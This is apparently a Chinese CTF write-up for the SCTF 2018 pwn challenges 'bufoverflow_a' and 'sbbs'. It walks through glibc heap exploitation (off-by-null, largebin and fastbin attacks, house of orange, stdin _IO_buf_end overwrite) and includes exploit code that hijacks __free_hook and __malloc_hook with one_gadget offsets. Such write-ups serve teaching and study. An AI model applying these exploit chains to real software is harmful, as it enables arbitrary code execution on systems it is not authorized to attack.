# Write Up #
# bufoverflow_a #
## 1.题目分析 ##
刚碰到题目时以为是overlap+Unlink，但实际操作时才知道完全走不通。后面也是再看了大牛的报告后才知道原来是利用largebin attack修改global\_max\_fast后再利用fastbin attack的思路，膜拜！！！。  
程序的漏洞点相对好找，主要位于read_buf函数中，该函数存在一个明显的off by null漏洞。  
**漏洞点：**  
![vul](https://raw.githubusercontent.com/fade-vivida/CTF/master/sctf2018/pwn/picture/buf_a_vul.JPG)  

## 2.利用思路 ##
这道题目可以采用三种解法：largebin attack ， unsortedbin attack（攻击\_IO\_list\_all) , unsortedbin attack（攻击\IO\_buf\_end)  

下面着重介绍largebin attack的方法，之后会附带介绍unsortedbin attack攻击流程。
### 2.1 leak libc address ###
老方法，申请一个大于fastbin的chunk，然后将其释放。
### 2.2 leak heap address ###
申请smallbin chunk0，chunk1，chunk2，chunk3,然后free(0),free(2),free(3),此时chunk2会和chunk3合并到top chunk中，然后再次申请一个smallbin chunk，则其fd字段（实则为chunk2的fd）就保存着heap address。

	#step 2: leak heap address
	Delete(1)
	Delete(0)
	//free(0)和free(1)是为了还原为最初状态，否则，再次申请chunk将会调用calloc，会清空fd字段。

	Alloc(0x100)	#0
	Alloc(0x100)	#1
	Alloc(0x200)	#2
	Alloc(0x100)	#3

	Delete(0)
	Delete(2)
	Delete(3)

	Alloc(0x200)	#0
	Show()
	heap_addr = u64(rv(6).ljust(8,'\x00')) - 0x20
	lg('heap_addr',heap_addr)
### 2.3 overlap ###
首先申请chunk0，chunk1，chunk2。然后释放chunk0，并再次申请同样size的chunk，将chunk0申请回来，然后对chunk0进行填充伪造，并使其发生一字节溢出（null字节）。

	Alloc(0x108)	#0
	Alloc(0x4f0)	#1
	Alloc(0x100)	#2

	Delete(0)
	Alloc(0x108)	#0

	fake_fd = heap_addr - 0x18 + 0x18
	fake_bk = heap_addr - 0x10 + 0x18

	payload = p64(0) + p64(0x101) + p64(fake_fd) + p64(fake_bk)
	payload = payload.ljust(0x100,'\x00')
	payload += p64(0x100)
	Fill(payload)
伪造的chunk内容为：  

	|       presize=0x0      |       size=0x101       |
	| fd=heap_addr-0x18+0x18 | bk=heap_addr-0x10+0x18 |
	|*************************************************|
	|*************...................*****************|
	|************....................*****************|
	|      presize=x0100     | size=size & 0xffffff00 |

	Delete(1)
然后free(1),触发前向unlink。

	Alloc(0xf0)		#1
	Alloc(0x4f0)	#3

	Delete(0)
	Alloc(0x100)	#0
	payload = p64(0) + p64(0x711)
	Fill(payload)
此时，chunk0与chunk1发生overlap，可以通过chunk0覆写chunk1的size字段。

	Delete(3)
	Alloc(0x500)	#3

	Delete(1)
	Alloc(0x700)	#1

	global_max_fast = libc.address + 0x39B7D0
	lg('global_max_fast',global_max_fast)
	payload = 'a'*0xf0 + p64(0) + p64(0x501) + p64(0) + p64(heap_addr) + p64(0) + p64(global_max_fast-0x20)+'A'*(0x4f0-0x20)+p64(0x21)*8
	Fill(payload)
此时largebin链表中保存着一块大小为0x500的chunk，通过overlap覆写改写该chunk的fd，bk，fd\_nextsize,bk\_nextsize字段。改写后的largebin chunk如下所示：

	||        presize = 0x0       ||             size = 0x501             ||
	||          fd = 0x0          ||            bk = heap_addr            ||
	||      fd_nextsize= 0x0      || bk_nextsize = global_max_fast - 0x20 ||
之所以要修改为这样是为了触发之后的largebin attack。  
在这里我们首先看下，largebin在申请过程中存在下列关键代码：

	while ((unsigned long) size < chunksize_nomask (fwd))
	{
		fwd = fwd->fd_nextsize;
		assert (chunk_main_arena (fwd));
	}
	//遍历链表，寻找小于等于victim的chunk
	if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
		/* Always insert in the second position.  */
		fwd = fwd->fd;
		//由于当前链表中已经存在该大小的chunk，因此不再将victim chunk链入fd_nextsize和bk_nextsize组成的链表中
	else
	{
		victim->fd_nextsize = fwd;
		victim->bk_nextsize = fwd->bk_nextsize;
		fwd->bk_nextsize = victim;
		victim->bk_nextsize->fd_nextsize = victim;	//关键语句
	}
	
其中victim即是当前要插入largebin链表的chunk，其中  
victim->bk\_nextsize->fd\_nextsize = fwd->bk\_nextsize->fd\_nextsize = global\_max\_fast - 0x20 + 0x20  
即global\_max\_fast = victim。达到了修改global\_max\_fast值的目的。

	Alloc(0x510)	#4
	Alloc(0x510)	#5
	Delete(4)
	Delete(0)
	Alloc(0x100)
因此通过释放chunk4，chunk0，然后再次分配chunk0大小的chunk（此时在unsortedbin中存在chunk0和chunk4，chunk4先于chunk0加入，会被先遍历到），将chunk4加入largebin链表来触发largebin attack。

另外一种可以用来改写global\_max\_fast的chunk伪造方法为

	||        presize = 0x0       ||             size = 0x501             ||
	|| 		    fd = 0x0          ||        bk = glboal_max_fast - 0x10   ||
	||      fd_nextsize= 0x0      ||          bk_nextsize = heap_addr     ||

由于在largebin chunk存在两个链表，因此还可以利用fd，bk指针构成的链表达到给global\_max\_fast赋值的目的。其中fd，bk组成的链表加入chunk的语句如下所示。

	bck = fwd->bk;	//关键语句
	victim->bk = bck;
	victim->fd = fwd;
	fwd->bk = victim;
	bck->fd = victim;	//关键语句
### 2.4 fastbin attack ###
fastbin attack的攻击过程如下所示：  
1.申请大小为0x110的chunk0，覆写chunk1的size字段。  
2.释放chunk1，释放chunk0。  
3.此时chunk1已在fastbin链表中，再次申请chunk0，修改chunk1的fd字段为heap\_addr+8（很精妙的借助heap\_cur->ptr指针达到修改free\_hook的目的）。  
4.再次申请chunk1，此时chunk1所在的fastbin链表中的fd指针就指向了heap\_addr+8。  
5.释放chunk0，然后再申请chunk0，是的heap\_cur->size的值为0x100，为了接下来绕过fastbin检查。  
6.再次申请大小为0x100的chunk，即可随意改写heap\_cur->ptr指针。


	Alloc(0x100)
	Fill(p64(0)+p64(0x101))
	Delete(1)
	Delete(0)
	Alloc(0x100)
	Fill(p64(0)+p64(0x101)+p64(heap_addr+8))
	Alloc(0xf0)
	Delete(0)
	Alloc(0x100)
	Alloc(0xf0)

	free_hook = libc.symbols['__free_hook']
	Fill(p64(free_hook))

	magic = 0x4526a
	magic = 0x3f52a
	Fill(p64(libc.address+magic))
	Delete(0)

## 3.exploit代码 ##
Largebin Attack 利用脚本：  
[https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/bufoverflow_a/cd4fc378-7ede-4d78-b4ac-95613fbd0120/largebin_attack.py](https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/bufoverflow_a/cd4fc378-7ede-4d78-b4ac-95613fbd0120/largebin_attack.py)
## 4.unsortedbin attack ##
利用 unsortedbin attack 进行 house of orange 攻击，其利用思路与其他题目类似，这道题目的重点是如何控制 unsortedbin 出现的时机，因为这道题目比较特殊，当申请多于两个的 chunk 后，再次 malloc chunk 或者 free chunk ，会对chunk内容进行清0xcc，这样如果我们造成overlap chunk后，想要释放它，则会对该chunk所包含的子chunk形成破坏。

因此，本题目采用了如下所示方法进行堆布局：

	Alloc(0x100)	#0
	Alloc(0x108)	#1
	Alloc(0xf0)		#2
	Alloc(0x100)	#3

	Delete(1)
	Alloc(0x108)	#1
	fake_fd = heap_addr - 0x18 + 0x18
	fake_bk = heap_addr - 0x10 + 0x18

	payload = p64(0) + p64(0x101) + p64(fake_fd) + p64(fake_bk)
	payload = payload.ljust(0x100,'\x00')
	payload += p64(0x100)
	Fill(payload)

	Delete(2)
首先申请4个chunk，释放1后再申请回来，并对chunk 1进行填充，形成对chunk 2的off by null。紧接着释放chunk 2，触发前向unlink。

	Alloc(0x1f0)	#2
	payload = p64(0x21)*0x3e
	Fill(payload)
然后再次申请size(chunk1)-0x10 + size(chunk2)+0x10大小的chunk，就可以将刚才释放的chunk再次分配回来（此时该chunk标号为chunk2），并进行填充（这一步填充的目的是为了之后释放伪造chunk绕过检查）。

	Delete(1)
	Delete(0)
	Alloc(0x210)	#0
	payload = '\x00'*0x110 + p64(0) + p64(0x91) + p64(0x21)*30
	Fill(payload)
然后释放chunk0，chunk1，两个chunk进行了合并，然后再次申请0x210大小的chunk，就可以吧chunk0+chunk1再次分配回来（此时该chunk标号为chunk0），并对其进行填充。这里需要注意的一点就是，此时chunk2的部分内容已被包含在chunk0中，因此我们可以通过修改chunk0内容对chunk2的头部进行改写（将其大小进行改写：0x201 --> 0x91）。

	Delete(3)
	Delete(2)
	Alloc(0x88)		#1
接着释放chunk3，chunk2，由于chunk2大小已经被我们改小，因此不会与chunk3进行合并。再次申请0x88大小的chunk，将刚才释放的chunk2再次分配回来（此时该chunk标号为chunk1）。

**关键点：为什么我们要这么辛苦的不断释放又申请chunk呢？其目的就是为了减少当前已经申请的chunk数量，使其小于2，满足不填充的malloc分支，而不是calloc分支。** 

此时我们可以发现，当前堆空间中，只有chunk0和chunk1，因此当运行Alloc(0x88)这句代码是，调用mallopt函数的第二个参数为0x0，再之后进行chunk free操作时，不会对chunk内容进行填充（0xcc）。

	Delete(0)
	Delete(1)
	Alloc(0x210)
	_IO_list_all = libc.symbols['_IO_list_all']
	jump_table_addr = libc.symbols['_IO_file_jumps'] + 0xc0
	one_gadget = libc.address + 0x3f52a
	payload = p64(0)*34 + p64(0) + p64(0x61) + p64(0) + p64(_IO_list_all-0x10) + p64(2) + p64(3)
	payload += (0xd8 - 6*8) * '\x00'
	payload += p64(jump_table_addr)
	payload += p64(one_gadget)
	Fill(payload)
下面的步骤就是正常的如何伪造unsortedbin，不再进行赘述。
## 5.unsortedbin attack 代码##
unsortedbin attack利用脚本

[https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/bufoverflow_a/cd4fc378-7ede-4d78-b4ac-95613fbd0120/unsortedbin_attack.py](https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/bufoverflow_a/cd4fc378-7ede-4d78-b4ac-95613fbd0120/unsortedbin_attack.py)
## 6.另一种解法 ##
看四叶草官方writeup发现这道题目可以使用另外一种解法，感觉十分有意思，在这里做以分析记录。  
首先官方writeup采用了一种十分巧妙的方式进行堆块的overlap  

步骤1：首先按照如下方式构造堆块。

	Alloc(0x88)			#0
	Alloc(0x400)		#1
	Alloc(0x100)		#2
	Alloc(0x88)			#3
步骤2：然后释放chunk0,chunk1

	Delete(0)
	Delete(1)
步骤3：再次将chunk0申请回来，填充后触发off by null，修改处于释放状态的chunk1的size字段。原本释放状态的chunk1的size字段值为0x411，溢出一个'\x00'后变为0x400，且该chunk位于unsortedbin中。

	Alloc(0x88)			#0
	Fill('a'*0x88)
步骤4：然后连续申请4个chunk，保证其总大小为0x400。由于我们在步骤3中修改了unsortedbin chunk的大小，使其减小了0x10，因此当我们申请这4个总大小为0x400的chunk后，耗尽了unsortedbin chunk，但在chunk2的头部字段中，还是会认为之前释放的chunk1并没有被使用。

	Alloc(0x88)			#1
	Alloc(0x88)			#4
	Alloc(0x200)		#5
	Alloc(0xc8)			#6
实际效果图：  
其中0x5555557584c0是chunk2的地址，0x555555758020开始为chunk0，chunk1，chunk4，chunk5，chunk6...chunk2。  
![buf_a](https://raw.githubusercontent.com/fade-vivida/CTF/master/sctf2018/pwn/picture/buf_a_1.JPG)  
可以看到尽管我们已经将之前释放的unsortedbin chunk已经用尽，但chunk的头仍然表示前面有一个0x410大小的未使用chunk。 

此时，我们再次释放chunk1，然后释放chunk2，即可以触发前向合并。

	Delete(1)
	Delete(2)
这里有一点需要注意，根据libc源代码，当触发chunk前向合并需重新计算合并后chunk大小时，不是使用待合并的两个chunk的size字段的和，而是利用如下公式进行计算：

	/* consolidate backward */
    if (!prev_inuse(p)) {
      prevsize = prev_size (p);
      size += prevsize;		//关键代码
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
也就是说计算前向合并时比较特殊，是使用当前chunk的size字段与当前chunk的presize字段相加直接计算。  

因此当我们free(1)，free(2)后就能够得到一个size = 0x520 大小的chunk
	
	计算公式：
	size = chunk2->size + chunk2->presize = 0x110 + 0x410 = 0x520
而不是size = 0x1a0 大小的chunk。

	计算公式：
	size = chunk2->size + chunk1->size = 0x110 + 0x90 = 0x1a0
此时我们再次释放chunk5，保证unsortedbin中有两个chunk（chunk1+chunk2 size=0x520，chunk2 size = 0x210），且chunk1与chunk2合并后的大chunk包含了chunk5。

	Delete(5)
然后再次调用Alloc(0x518)，将chunk1+chunk2申请回来，并伪造chunk2的fd，bk字段，用于之后触发unsortedbin attack。

	stdin = libc.symbols['_IO_2_1_stdin_']
	lg('stdin',stdin)
	Alloc(0x518)
	payload = 'a'*0x80
	payload += p64(0) + p64(0x91)
	payload += 'b'*0x80
	payload += p64(0) + p64(0x211)
	payload += p64(0) + p64(stdin + 0x30)
	Fill(payload)
这里需要注意的一点是，在官方的writeup中并没有去改写\_IO\_list\_all这样常规house of orange的做法，而是去改写了stdin+0x40地址处的内容，为什么要这么做呢？

实际通过调试可以发现，stdin+0x40地址处指向了标准输入的\_IO\_buf\_end。在正常情况下，由于程序调用了setvbuf(stdin,0,2,0)，也就是将stdin设置成了无缓冲IO流

	#define _IOFBF 0 /* Fully buffered. */
	#define _IOLBF 1 /* Line buffered. */
	#define _IONBF 2 /* No buffering. */
此时\_IO\_buf\_end = \_IO\_buf\_base + 1 = \_IO\_FILE->\_shortbuf + 1，即每输入一个字节后就将输入内容写入真正的目的地址。那么，如果我们能够改写\_IO\_buf\_end使其远大于\_IO\_buf\_base，就可以不断在缓冲区buf中写入内容直至输入指针等于\_IO\_buf\_end。  

unsortedbin attack before：  
![attack before](https://raw.githubusercontent.com/fade-vivida/CTF/master/sctf2018/pwn/picture/buf_a_before.JPG)

unsortedbin attack after：  
![attack before](https://raw.githubusercontent.com/fade-vivida/CTF/master/sctf2018/pwn/picture/buf_a_after.JPG)

可以看到main\_arena->top_chunk的地址是大于stdin->\_shortbuf的，并且\_\_malloc\_hook的地址正好位于两者之间，也就是说能够通过该方式改写malloc\_hook的内容，从而达成利用。  

stdin，malloc\_hook，main\_arena的空间布局如下图所示：  
![buf_a_2](https://raw.githubusercontent.com/fade-vivida/CTF/master/sctf2018/pwn/picture/buf_a_2.JPG)

**注：这里需要注意的一点就是，这道题之所以能利用这种方法，是因为其使用了scanf来读取数据（读入当前操作选择时），如果程序整个过程中都没有使用文件流函数，而是用read这种底层函数来代替，那么无法使用该方法。**

exploit利用代码：

[https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/bufoverflow_a/cd4fc378-7ede-4d78-b4ac-95613fbd0120/scanf_buf_end_attack.py](https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/bufoverflow_a/cd4fc378-7ede-4d78-b4ac-95613fbd0120/scanf_buf_end_attack.py)

# sbbs #
## 1.题目分析 ##
通过分析程序发现，程序login函数中存在缓冲区溢出漏洞，程序本意是允许用户输入8字节的用户名，但在真正输入过程中，read\_buff函数的第2个参数错误给成了0x10，导致其可以覆盖之后的一个指针变量，而这个指针变量原来的值时用来保存登录用户类型的地址。因此造成了任意地址写固定值的漏洞。  

![sbbs_vul](https://raw.githubusercontent.com/fade-vivida/CTF/master/sctf2018/pwn/picture/sbbs_vul.JPG)
## 2.漏洞利用 ##
漏洞的利用方法主要分为两种：  
### 2.1 修改 MAX\_FAST\_SIZE ###
该参数用来控制堆分配过程中fastbin的上限大小（32bit default:0x80 , 64bit default:0xa0），因此我们可以通过修改该值实现将一个大chunk放入fastbin链表中。

由于main\_arena->fastbinY链表数组位于main\_arena+8地址处，我们需要采用如下公式计算如何将目标地址修改为释放chunk的地址。
分配note size = ((target\_addr - (main\_arena + 8))/8 + 2)*0x10 - 0x10。

例如本题目中，我们想要修改\_IO\_list\_all触发house of orange，那么需要分配的note size就为

	size = ((_IO_list_all - fastbin)/8 + 2 )* 0x10 - 0x10
	create_note(size,payload)
我们可以现在目标 note 中伪造\_IO\_FILE结构体，然后通过改写MAX\_FAST\_SIZE，释放该note，将\_IO\_list\_all地址处修改为该chunk的地址，后续就是正常的house of orange流程。
### 2.2 修改chunk size字段，进行unsortedbin attack ###
泄露出堆地址后，采用错位对齐的方式修改某个chunk的size字段为0x6e69，则触发chunk overlap。并且由于程序规定申请chunk的size必须大于等于0x96，小于等于0x176f,因此需要申请多个chunk进行堆块布局。

具体布局方式可以参见利用代码
## 3.exploit代码 ##
修改MAX\_FAST\_SIZE代码：

[https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/sbbs/sbbs.py](https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/sbbs/sbbs.py)

unsortedbin attack代码：

[https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/sbbs/sbbs_unsorted_attack.py](https://github.com/fade-vivida/CTF/blob/master/sctf2018/pwn/sbbs/sbbs_unsorted_attack.py)
